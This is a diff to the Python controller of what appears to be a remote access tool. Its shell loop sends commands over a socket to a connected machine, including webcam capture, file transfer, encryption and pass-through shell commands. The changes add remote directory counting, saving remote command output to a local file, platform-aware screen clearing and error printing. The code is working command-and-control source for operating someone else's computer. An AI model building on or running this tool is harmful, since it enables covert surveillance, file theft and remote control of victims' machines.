@@ -5,6 +5,7 @@ import pickle
 import struct
 import cv2
 import numpy
+import platform
 from time import sleep
 from colorama import init
 from colorama.ansi import Fore
@@ -23,6 +24,7 @@ class TCP:
         self.__port = port
         # chunk -->  4MB para enviar informacion
         self.__chunk = 4194304
+        self.__myOs = platform.system().lower()
 
         # Se crea un socket
         self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -702,6 +704,32 @@ class TCP:
         else:
             print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")
 
+    # Funcion para obtener la cantidad de elementos de un directorio
+    # cmd --> comando ingresado
+    def lenDir(self, cmd):
+        self.__conexion.send(cmd.encode())
+
+        msg = self.__conexion.recv(1024).decode()
+        if msg[:6] != "error:":
+            msg = self.__conexion.recv(1024).decode()
+            print(Fore.GREEN + f"[+] {self.__userName}@{self.__addr[0]}: {msg}")
+        else:
+            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")
+
+    # Funcion para guardar en un archivo de texto la salida de un comando
+    # cmd --> comando ingresado
+    def save(self, cmd):
+        self.__conexion.send(cmd.encode())
+        with open("info.txt", 'w') as archivo:
+            while True:
+                info = self.recibirDatos().decode()
+                archivo.write(info)
+
+                if len(info) < self.__chunk:
+                    break
+        archivo.close()
+        print(Fore.GREEN + "[+] Informacion guardada")
+
     # Funcion para ingresar y evaluar comandos
     def shell(self):
         try:
@@ -721,13 +749,17 @@ class TCP:
                     try:
                         self.local(cmd[1:])
 
-                    except:
+                    except Exception as e:
                         print(Fore.RED + "[-] Error de sintaxis local")
+                        print(e)
 
                 # Si el comando es 'clear', 'cls' o 'clc'
                 # se limpiar la terminal
                 elif cmd.lower() == "clear" or cmd.lower() == "cls" or cmd.lower() == "clc":
-                    os.system("clear")
+                    if self.__myOs == "linux" or self.__myOs == "darwin":
+                        os.system("clear")
+                    if self.__myOs == "windows":
+                        os.system("cls")
 
                 # Si el comando es 'exit'...
                 elif cmd.lower() == "exit":
@@ -738,8 +770,9 @@ class TCP:
                         if salir:
                             break
 
-                    except:
+                    except Exception as e:
                         print(Fore.RED + "[-] Error al terminar la conexion")
+                        print(e)
 
                 # Si el comando es 'q' o 'quit'...
                 elif cmd.lower() == 'q' or cmd.lower() == "quit":
@@ -751,8 +784,9 @@ class TCP:
                         self.__sock.close()
                         break
 
-                    except:
+                    except Exception as e:
                         print(Fore.RED + "[-] Error al cerrar el programa")
+                        print(e)
 
                 # Si el comando es 'cd'...
                 # Parametros:
@@ -762,8 +796,9 @@ class TCP:
                         # Se manda a llamar a la funcion 'self.cd'
                         self.cd(cmd)
 
-                    except:
+                    except Exception as e:
                         print(Fore.RED + "[-] Error de proceso (cd)")
+                        print(e)
 
                 # Si el comando es 'sff'...
                 # Parametros:
@@ -779,8 +814,9 @@ class TCP:
                         else:
                             print(Fore.YELLOW + "[!] Falta del parametro de origen (-o)")
 
-                    except:
+                    except Exception as e:
                         print(Fore.RED + "[-] Error de proceso (sff)")
+                        print(e)
 
                 # Si el comando es 'sft'...
                 # * -o ubicacion del archivo origen del servidor
@@ -794,8 +830,9 @@ class TCP:
                         else:
                             print(Fore.RED + "[!] Falta del parametro de origen (-o)")
 
-                    except:
+                    except Exception as e:
                         print(Fore.RED + "[-] Error de proceso (sft)")
+                        print(e)
 
                 # Si el comando es 'img'
                 # Parametros:
@@ -820,8 +857,9 @@ class TCP:
                         else:
                             print(Fore.YELLOW + "[!] Falta del parametro imagen (-i)")
 
-                    except:
+                    except Exception as e:
                         print(Fore.RED + "[-] Error de proceso (img)")
+                        print(e)
 
                 # Si el comando es 'pic'...
                 # Parametros:
@@ -837,8 +875,9 @@ class TCP:
                         else:
                             print(Fore.YELLOW + "[!] Falta del parametro camara (-c)")
 
-                    except:
+                    except Exception as e:
                         print(Fore.RED + "[-] Error de proceso (pic)")
+                        print(e)
 
                 # Si el comando es 'cap'...
                 # Parametros:
@@ -853,8 +892,9 @@ class TCP:
                         else:
                             print(Fore.YELLOW + "[!] Falta del parametro camara (-c)")
 
-                    except:
+                    except Exception as e:
                         print(Fore.RED + "[-] Error de proceso (cap)")
+                        print(e)
 
                 # Si el comando es 'sdf'...
                 # Parametros:
@@ -870,8 +910,9 @@ class TCP:
                         else:
                             print(Fore.YELLOW + "[!] Falta del parametro origen (-o)")
 
-                    except:
+                    except Exception as e:
                         print(Fore.RED + "[-] Error de proceso (sdf)")
+                        print(e)
 
                 # Si el comando es 'sdt'...
                 # Parametros:
@@ -886,8 +927,9 @@ class TCP:
                         else:
                             print(Fore.YELLOW + "[!] Falta del parametro origen (-o)")
 
-                    except:
+                    except Exception as e:
                         print(Fore.RED + "[-] Error de proceso (sdt)")
+                        print(e)
 
                 # Si el comando es 'zip'...
                 # Parametros:
@@ -902,8 +944,9 @@ class TCP:
                         else:
                             print(Fore.YELLOW + "[!] Falta del parametro de origen (-o)")
 
-                    except:
+                    except Exception as e:
                         print(Fore.RED + "[-] Error de proceso (zip)")
+                        print(e)
 
                 # Si el comando es 'unzip'...
                 # Parametros:
@@ -919,8 +962,9 @@ class TCP:
                         else:
                             print(Fore.YELLOW + "[!] Falta del parametro de origen (-o)")
 
-                    except:
+                    except Exception as e:
                         print(Fore.RED + "[-] Error de proceso (unzip)")
+                        print(e)
 
                 # Si el comando es 'encrypt'...
                 # Parametros:
@@ -939,8 +983,9 @@ class TCP:
                         else:
                             print(Fore.YELLOW + "[!] Falta del parametro key (-k)")
 
-                    except:
+                    except Exception as e:
                         print(Fore.RED + "[-] Error de proceso (encrypt)")
+                        print(e)
 
                 # Si el comando es 'decrypt'...
                 # Parametros:
@@ -960,8 +1005,9 @@ class TCP:
                         else:
                             print(Fore.YELLOW + "[!] Falta del parametro decrypt (-d)")
 
-                    except:
+                    except Exception as e:
                         print(Fore.RED + "[-] Error de proceso (decrypt)")
+                        print(e)
 
                 # Si el comando es 'miwget'...
                 # Parametros:
@@ -976,8 +1022,41 @@ class TCP:
                         else:
                             print(Fore.YELLOW + "[!] Falta del parametro url (-u)")
 
-                    except:
+                    except Exception as e:
                         print(Fore.RED + "[-] Error de proceso (miwget)")
+                        print(e)
+
+                # Si el comando es 'lendir'...
+                # Parametros:
+                # * -p path del directorio
+                # + -f contar solo los archivos
+                # + -d contar solo los directorios
+                # + -a contar todos los elementos (opcion por default)
+                elif cmd.lower()[:6] == "lendir":
+                    try:
+                        if re.search("-p", cmd):
+                            # Se manda a llamar a la funcion
+                            # 'self.lenDir'
+                            self.lenDir(cmd)
+
+                        else:
+                            print(Fore.YELLOW + "[!] Falta del parametro path (-p)")
+
+                    except Exception as e:
+                        print(Fore.RED + "[-] Error de proceso (lenDir)")
+                        print(e)
+
+                # Si el comando es 'save'...
+                # No tiene parametros
+                elif cmd.lower()[:4] == "save":
+                    try:
+                        # Se manda a llamar a la funcion
+                        # 'self.save'
+                        self.save(cmd)
+
+                    except Exception as e:
+                        print(Fore.RED + "[-] Error de proceso (save)")
+                        print(e)
 
                 # Si no hay una coincidencia, se envia el comando
                 # y se recibe lo que este regresa
